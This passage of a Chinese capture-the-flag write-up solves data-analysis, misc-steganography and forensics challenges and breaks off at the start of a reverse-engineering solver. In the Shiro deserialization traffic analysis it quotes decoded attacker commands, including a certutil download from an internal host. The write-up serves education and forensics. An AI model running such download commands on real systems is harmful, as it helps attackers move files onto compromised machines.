class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><br><br><span class="hljs-comment"># 数据脱敏函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">data, flag</span>):<br>    <span class="hljs-comment"># username</span><br>    <span class="hljs-keyword">if</span> flag == <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">2</span>:<br>            <span class="hljs-keyword">return</span> data[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;*&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> data[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;*&#x27;</span> * (<span class="hljs-built_in">len</span>(data) - <span class="hljs-number">2</span>) + data[-<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># password</span><br>    <span class="hljs-keyword">elif</span> flag == <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">return</span> hashlib.md5(data.encode()).hexdigest()<br>    <span class="hljs-comment"># name</span><br>    <span class="hljs-keyword">elif</span> flag == <span class="hljs-number">3</span>:<br>        pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;[\u4e00-\u9fa5]+&#x27;</span>)<br>        match = pattern.findall(data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(match[<span class="hljs-number">0</span>]) != <span class="hljs-built_in">len</span>(data):<br>            <span class="hljs-keyword">raise</span> Exception()<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(match[<span class="hljs-number">0</span>]) == <span class="hljs-number">2</span>:<br>            <span class="hljs-keyword">return</span> match[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;*&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> match[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;*&#x27;</span> * (<span class="hljs-built_in">len</span>(match[<span class="hljs-number">0</span>]) - <span class="hljs-number">2</span>) + match[<span class="hljs-number">0</span>][-<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># idcard</span><br>    <span class="hljs-keyword">elif</span> flag == <span class="hljs-number">4</span>:<br>        <span class="hljs-comment"># 只显示年份</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;*&#x27;</span> * <span class="hljs-number">6</span> + data[<span class="hljs-number">6</span>:<span class="hljs-number">10</span>] + <span class="hljs-string">&#x27;*&#x27;</span> * <span class="hljs-number">8</span><br>    <span class="hljs-comment"># phone</span><br>    <span class="hljs-keyword">elif</span> flag == <span class="hljs-number">5</span>:<br>        <span class="hljs-keyword">return</span> data[:<span class="hljs-number">3</span>] + <span class="hljs-string">&#x27;*&#x27;</span> * <span class="hljs-number">4</span> + data[-<span class="hljs-number">4</span>:]<br><br><br><span class="hljs-comment"># 身份证校验</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sfz_check</span>(<span class="hljs-params">data</span>):<br>    data = data[:-<span class="hljs-number">1</span>]<br>    data = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, data))<br>    xi = [<span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>]<br>    <span class="hljs-built_in">sum</span> = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">17</span>):<br>        <span class="hljs-built_in">sum</span> += xi[i] * <span class="hljs-built_in">int</span>(data[i])<br>    <span class="hljs-built_in">sum</span> %= <span class="hljs-number">11</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">sum</span> == <span class="hljs-number">0</span>:<br>        data.append(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">sum</span> == <span class="hljs-number">1</span>:<br>        data.append(<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">elif</span> <span class="hljs-built_in">sum</span> == <span class="hljs-number">2</span>:<br>        data.append(<span class="hljs-string">&#x27;X&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        data.append(<span class="hljs-built_in">str</span>(<span class="hljs-number">12</span> - <span class="hljs-built_in">sum</span>))<br>    <span class="hljs-keyword">return</span> data[-<span class="hljs-number">1</span>]<br><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;error.log&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.readlines()<br><br>pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;username=(.*?)&amp;name=(.*?)&amp;idcard=(.*?)&amp;phone=(.+)&#x27;</span>)<br>pattern2 = re.<span class="hljs-built_in">compile</span>(<br>    <span class="hljs-string">r&#x27;: ([\w\d]+?)\\n&#x27;</span>)<br><br>phum = [<span class="hljs-number">734</span>, <span class="hljs-number">735</span>, <span class="hljs-number">736</span>, <span class="hljs-number">737</span>, <span class="hljs-number">738</span>, <span class="hljs-number">739</span>, <span class="hljs-number">747</span>, <span class="hljs-number">748</span>, <span class="hljs-number">750</span>, <span class="hljs-number">751</span>, <span class="hljs-number">752</span>, <span class="hljs-number">757</span>, <span class="hljs-number">758</span>, <span class="hljs-number">759</span>, <span class="hljs-number">772</span>, <span class="hljs-number">778</span>, <span class="hljs-number">782</span>, <span class="hljs-number">783</span>, <span class="hljs-number">784</span>, <span class="hljs-number">787</span>, <span class="hljs-number">788</span>, <span class="hljs-number">795</span>,<br>        <span class="hljs-number">798</span>, <span class="hljs-number">730</span>, <span class="hljs-number">731</span>, <span class="hljs-number">732</span>, <span class="hljs-number">740</span>, <span class="hljs-number">745</span>, <span class="hljs-number">746</span>, <span class="hljs-number">755</span>, <span class="hljs-number">756</span>, <span class="hljs-number">766</span>, <span class="hljs-number">767</span>, <span class="hljs-number">771</span>, <span class="hljs-number">775</span>, <span class="hljs-number">776</span>, <span class="hljs-number">785</span>, <span class="hljs-number">786</span>, <span class="hljs-number">796</span>, <span class="hljs-number">733</span>, <span class="hljs-number">749</span>, <span class="hljs-number">753</span>, <span class="hljs-number">773</span>, <span class="hljs-number">774</span>,<br>        <span class="hljs-number">777</span>, <span class="hljs-number">780</span>, <span class="hljs-number">781</span>, <span class="hljs-number">789</span>, <span class="hljs-number">790</span>, <span class="hljs-number">791</span>, <span class="hljs-number">793</span>, <span class="hljs-number">799</span>]<br><br><br>ds = []<br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(data):<br>    match = pattern.findall(parse.unquote(data[i].decode()))<br>    <span class="hljs-keyword">if</span> match:<br>        passwddata = <span class="hljs-string">b&#x27;&#x27;</span>.join(data[i:i + <span class="hljs-number">10</span>]).decode()<br>        passwd = pattern2.search(passwddata)<br>        <span class="hljs-keyword">if</span> passwd:<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">if</span> sfz_check(match[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>]) != match[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>][-<span class="hljs-number">1</span>]:<br>                    <span class="hljs-keyword">raise</span> Exception()<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(match[<span class="hljs-number">0</span>][<span class="hljs-number">3</span>][<span class="hljs-number">0</span>:<span class="hljs-number">3</span>]) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> phum:<br>                    <span class="hljs-keyword">raise</span> Exception()<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> match[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>].isalnum():<br>                    <span class="hljs-keyword">raise</span> Exception()<br>                d = &#123;<span class="hljs-string">&#x27;username&#x27;</span>: check(match[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>], <span class="hljs-number">1</span>), <span class="hljs-string">&#x27;password&#x27;</span>: check(passwd.groups()[<span class="hljs-number">0</span>], <span class="hljs-number">2</span>),<br>                     <span class="hljs-string">&#x27;name&#x27;</span>: check(match[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>], <span class="hljs-number">3</span>), <span class="hljs-string">&#x27;idcard&#x27;</span>: check(match[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>], <span class="hljs-number">4</span>),<br>                     <span class="hljs-string">&#x27;phone&#x27;</span>: check(match[<span class="hljs-number">0</span>][<span class="hljs-number">3</span>], <span class="hljs-number">5</span>)&#125;<br>                ds.append(d)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br>        i += <span class="hljs-number">10</span><br>    i += <span class="hljs-number">1</span><br><br><span class="hljs-comment"># print(ds)</span><br><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;example.csv&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-string">&#x27;username,password,name,idcard,phone\n&#x27;</span>)<br>    <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> ds:<br>        f.write(<span class="hljs-string">&#x27;,&#x27;</span>.join(d.values()) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/wp/2024/2024-ycb-c-data-analy3.png"></p><h1 id="初赛-misc"><a href="#初赛-misc" class="headerlink" title="[初赛] misc"></a>[初赛] misc</h1><h2 id="hiden"><a href="#hiden" class="headerlink" title="hiden"></a>hiden</h2><p>文件名提示 <code>60=()+().txt</code><br>先rot47在rot13</p><p>得到加密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> wave<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    txt_data = f.read()<br>    file_len = <span class="hljs-built_in">len</span>(txt_data)<br>    txt_data = file_len.to_bytes(<span class="hljs-number">3</span>, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>) + txt_data<br><br><span class="hljs-keyword">with</span> wave.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;test.wav&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    attrib = f.getparams()<br>    wav_data = <span class="hljs-built_in">bytearray</span>(f.readframes(-<span class="hljs-number">1</span>))<br><br><span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(txt_data)):<br>    wav_data[index * <span class="hljs-number">4</span>] = txt_data[index]<br><br><span class="hljs-keyword">with</span> wave.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;hiden.wav&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.setparams(attrib)<br>    f.writeframes(wav_data)<br></code></pre></td></tr></table></figure><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> wave<br><br><span class="hljs-keyword">with</span> wave.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;hiden.wav&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    wav_data = <span class="hljs-built_in">bytearray</span>(f.readframes(-<span class="hljs-number">1</span>))<br><br>txt_data = <span class="hljs-built_in">bytearray</span>()<br><span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(wav_data), <span class="hljs-number">4</span>):<br>    txt_data.append(wav_data[index])<br><br>file_len = <span class="hljs-built_in">int</span>.from_bytes(txt_data[:<span class="hljs-number">3</span>], byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br>original_data = txt_data[<span class="hljs-number">3</span>:file_len + <span class="hljs-number">3</span>]<br><br><span class="hljs-built_in">print</span>(original_data.decode())<br></code></pre></td></tr></table></figure><h2 id="不一样的数据库-2"><a href="#不一样的数据库-2" class="headerlink" title="不一样的数据库_2"></a>不一样的数据库_2</h2><p>纯数字暴力破解，得到压缩包密码<code>753951</code></p><p>二维码画上定位符扫码得到<code>NRF@WQUKTQ12345&amp;WWWF@WWWFX#WWQXNWXNU</code></p><p><img src="/img/wp/2024/2024-ycb-c-%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93_2-1.png"></p><p>rot13得到<code>AES@JDHXGD12345&amp;JJJS@JJJSK#JJDKAJKAH</code></p><p>压缩包中的另一个文件<code>Kee.kdbx</code>百度可知用keepass打开，密码就是二维码解密的内容</p><p><img src="/img/wp/2024/2024-ycb-c-%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93_2-2.png"></p><p>打开后查看历史修改记录，得到一串加密字符串，和提示aes</p><p><img src="/img/wp/2024/2024-ycb-c-%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93_2-3.png"></p><p>aes的密码就是打开软件后出现的<code>DASCTF</code></p><p><img src="/img/wp/2024/2024-ycb-c-%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93_2-4.png"></p><p><img src="/img/wp/2024/2024-ycb-c-%E4%B8%8D%E4%B8%80%E6%A0%B7%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93_2-5.png"></p><h2 id="so-much"><a href="#so-much" class="headerlink" title="so much"></a>so much</h2><p>打开题目，给了一个<code>c2hpZnQh.ad1</code>的磁盘文件</p><p>文件尾存在额外数据：<code>the key is: 1234567   really?</code></p><p>将文件名base64解码得到<code>shift!</code></p><p>使用ftk的<code>Decrypt AD1 image</code>对附件解密，密码是1234567加上shift，即<code>!@#$%^&amp;</code></p><p>解密后继续用ftk挂载到磁盘上，发现存在344个<code>.crypto</code>文件</p><p><img src="/img/wp/2024/2024-ycb-c-so-much-1.png"></p><p>同时，文件的时间只有<code>2021/8/5 16:19</code>和<code>2021/8/5 16:20</code></p><p>对秒数进行操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment"># 获取344个文件的时间</span><br>time = [<span class="hljs-string">&#x27;&#x27;</span>] * <span class="hljs-number">344</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">344</span>):<br>    time[j] = os.path.getmtime(<span class="hljs-string">&#x27;S:\\&#x27;</span> + <span class="hljs-built_in">str</span>(j) + <span class="hljs-string">&#x27;.crypto&#x27;</span>)<br><br><br><span class="hljs-comment"># 按顺序转换成0和1</span><br>key = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">344</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">str</span>(time[i]) == <span class="hljs-string">&#x27;1628151585.73009&#x27;</span>:<br>        key += <span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        key += <span class="hljs-string">&#x27;1&#x27;</span><br><br><br><span class="hljs-comment"># 344刚好可以整除8，转成字符串</span><br>key = [key[i:i+<span class="hljs-number">8</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(key), <span class="hljs-number">8</span>)]<br>key = <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i, <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> key])<br><span class="hljs-built_in">print</span>(key)<br><br></code></pre></td></tr></table></figure><p>得到<code>the_key_is_700229c053b4ebbcf1a3cc37c389c4fa</code></p><p>使用<code>Encrypto</code>对两个时间不一样的文件解密即可</p><p><img src="/img/wp/2024/2024-ycb-c-so-much-2.png"></p><p>拼接在一起得到flag</p><p><img src="/img/wp/2024/2024-ycb-c-so-much-3.png"></p><h2 id="miaoro"><a href="#miaoro" class="headerlink" title="miaoro"></a>miaoro</h2><p>打开流量包筛选http流量</p><p>根据返回值的特征<code>$$$xxxxxxxx$$$</code>和攻击请求头中的<code>Cookie</code>和<code>GWHT</code>字段可以判断出是shiro反序列化攻击的流量</p><p>将Cookie中的内容进行枚举爆破，得到flag1 <code>DASCTF&#123;B916CFEB-C40F-45D6-A7BC-</code></p><p><img src="/img/wp/2024/2024-ycb-c-miaoro-1.png"></p><p>其中有两条请求base64解码后的命令为</p><p><code>echo Th15_11111111s_pP@sssssw000rd!!!&gt;pass.txt</code><br><code>certutil -urlcache -f &quot;http://192.168.1.3:801/secret.txt&quot;</code></p><p>将secret.txt的数据导出</p><p>发现结尾是<code>036009000414030b405</code>，写脚本逆序并反转字节</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python2</span><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.data&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>)<br>d = f.read()<br>e = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    c = <span class="hljs-built_in">ord</span>(i)<br>    e += <span class="hljs-built_in">chr</span>(((c &amp; <span class="hljs-number">0xf</span>) &lt;&lt; <span class="hljs-number">4</span>) + (c &gt;&gt; <span class="hljs-number">4</span>))<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.zip&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(e[::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><p>使用上面的密码解压得到flag2.jpg</p><p>画面明显被分割了，尝试修改高宽</p><p><img src="/img/wp/2024/2024-ycb-c-miaoro-2.png"></p><p><img src="/img/wp/2024/2024-ycb-c-miaoro-3.png"></p><p>网上找一个字母表对应后得到<code>EBOFDELQDIAA&#125;</code></p><h2 id="Check-in"><a href="#Check-in" class="headerlink" title="Check in"></a>Check in</h2><p>附件压缩包中的注释base58解码得到<code>Welcome2GZ</code></p><p>根据提示用wbs43open解txt隐写</p><p><img src="/img/wp/2024/2024-ycb-c-Check-in-1.png"></p><p>解出得到一个log文件，是TLS的密钥log，导入到wireshark中</p><p><img src="/img/wp/2024/2024-ycb-c-Check-in-2.png"></p><p>将附件txt内容转成pcapng后打开后发现上传了一个flag.gif</p><p><img src="/img/wp/2024/2024-ycb-c-Check-in-3.png"></p><p>使用identify分析，发现gif每帧的间隔时间在3和23转换</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">identify -format &quot;%T, &quot; 1.gif<br>3, 23, 3, 23, 3, 23, 3, 23, 3, 23, 3, 23, 23, 23, 23, 23, 3, 3, 23, 23, 3, 3, 3, 3, 3, 23, 23, 23, 3, 23, 23, 23, 3, 23, 3, 3, 23, 23, 23, 3, 3, 23, 3, 23, 23, 23, 23, 23, 3, 3, 23, 23, 3, 3, 3, 23, 3, 23, 3, 23, 3, 23, 3, 3<br></code></pre></td></tr></table></figure><p>将23转成1，3转成0后转字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">a = [<span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">23</span>, <span class="hljs-number">3</span>, <span class="hljs-number">3</span>]<br><br>a = [<span class="hljs-number">1</span> <span class="hljs-keyword">if</span> x == <span class="hljs-number">23</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> a]<br><br>binary_string = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>, a))<br><br>chars = [<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(binary_string[i:i+<span class="hljs-number">8</span>], <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(binary_string), <span class="hljs-number">8</span>)]<br>result = <span class="hljs-string">&#x27;&#x27;</span>.join(chars)<br><span class="hljs-built_in">print</span>(result)<br><br><span class="hljs-comment"># U_0wN_1T</span><br></code></pre></td></tr></table></figure><h2 id="1z-misc"><a href="#1z-misc" class="headerlink" title="1z_misc"></a>1z_misc</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">天地玄黄，宇宙洪荒；日月盈昃，辰宿列张；万物芸芸，息息相关；是以十二岁而行二十八宿，其间奥妙，待探寻，显真章。<br>若女可为11，可为1124......觜可为91，亦可为725......如此往复，周而复始。<br>祈解其秘：[43,101,55,16,16,1017,28,812,824,43,55,226,101,55,55,415,1017,1027,28,28,617,824,28,812,1027,16,101,16,55,1027,1017,28,16]<br></code></pre></td></tr></table></figure><p>结合例子和hint的图片可以得知</p><p>将数字拆成两部分</p><p>第一部分从子开始数，比如1就是子，4就是卯，10就是酉。。。。<br>第二部分的数字表述对应星宿的位置（格子中从右往左逆时针数），比如子的1就是女，卯的3就是心</p><p><img src="/img/wp/2024/2024-ycb-c-1z_misc-1.png"></p><p>将题目给的数组转成对应的文字</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">心,胃,心,奎,奎,心,奎,心,胃,心,心,心,胃,心,心,胃,心,奎,奎,奎,奎,胃,奎,心,奎,奎,胃,奎,心,奎,心,奎,奎<br></code></pre></td></tr></table></figure><p>只有三种文字，将心替换成<code>.</code> 胃替换成<code>/</code> 奎替换成<code>-</code></p><p>解摩斯得到密码<code>E@SI1Y!</code></p><p><img src="/img/wp/2024/2024-ycb-c-1z_misc-2.png"></p><p>解压后看flag文件尾，符合lyra文件特征，同时hint.jpg中的天琴座也表明是lyra</p><p><code>bazel-bin/lyra/cli_example/decoder_main --encoded_path=flag.lyra --output_dir=./ --bitrate=3200</code></p><p>得到一段wav</p><p><img src="/img/wp/2024/2024-ycb-c-1z_misc-3.png"></p><p>在线<a href="https://www.luyinzhushou.com/voice2text/">语音转文本</a>（语速有点快，可以au降速后去识别）后，得到一段社会主义编码，解码得到flag</p><p><img src="/img/wp/2024/2024-ycb-c-1z_misc-4.png"></p><h1 id="初赛-reverse"><a href="#初赛-reverse" class="headerlink" title="[初赛] reverse"></a>[初赛] reverse</h1><h2 id="pic"><a href="#pic" class="headerlink" title="pic"></a>pic</h2><p>爆破五位十六进制得到rc4密钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">from</span> mcrypt <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">rc4</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">toBytes</span>(<span class="hljs-params">self,data</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(data)==<span class="hljs-built_in">str</span>:<br>            <span class="hljs-keyword">return</span> data.encode()<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">type</span>(data)==<span class="hljs-built_in">bytes</span>:<br>            <span class="hljs-keyword">return</span> data<br>        <span class="hljs-keyword">else</span>:<br>            <span 